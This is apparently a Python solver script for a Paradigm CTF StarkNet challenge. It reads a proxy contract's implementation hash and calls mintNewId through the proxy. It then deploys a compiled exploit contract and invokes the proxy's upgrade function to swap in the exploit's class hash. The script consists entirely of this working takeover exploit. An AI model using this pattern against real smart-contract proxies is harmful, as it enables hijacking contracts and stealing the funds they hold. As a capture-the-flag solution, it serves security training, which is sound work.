# First compile the exploit contract
# starknet-compile exploit.cairo --output exploit.json

from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from starkware.starknet.public.abi import get_storage_var_address

from paradigmctf.cairo_challenge import *


async def solver(client: AccountClient, proxy_contract: Contract):

    implementation_class_hash = await client.get_storage_at(
        proxy_contract.address, get_storage_var_address("implementation"), "latest"
    )
    implementation_address = calculate_contract_address_from_hash(
        salt=111111,
        class_hash=implementation_class_hash,
        constructor_calldata=[],
        deployer_address=0,
    )

    implemenatation_contract = await Contract.from_address(
        implementation_address, client
    )

    wrapper_contract = Contract(
        proxy_contract.address,
        implemenatation_contract.data.abi,
        client,
    )
    result = await wrapper_contract.functions["mintNewId"].invoke(
        1, 1, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()

    print("[+] deploy exploit")
    exploit_deployment = await Contract.deploy(
        client=client,
        compiled_contract=Path("exploit.json").read_text(),
        constructor_args=[],
        salt=111111,
    )
    await exploit_deployment.wait_for_acceptance()

    print("[+] Upgrading contract")
    result = await proxy_contract.functions["upgrade"].invoke(
        await client.get_class_hash_at(exploit_deployment.deployed_contract.address),
        max_fee=int(1e16),
    )
    await result.wait_for_acceptance()
    # response = await client.execute(
    #     calls=[
    #         wrapper_contract.deployed_contract.functions["upgrade"].prepare(
    #             await client.get_class_hash_at(
    #                 exploit_deployment.deployed_contract.address
    #             )
    #         ),
    #     ],
    #     max_fee=int(1e16),
    # )
    # await client.wait_for_tx(response.transaction_hash)


run_solver(solver)
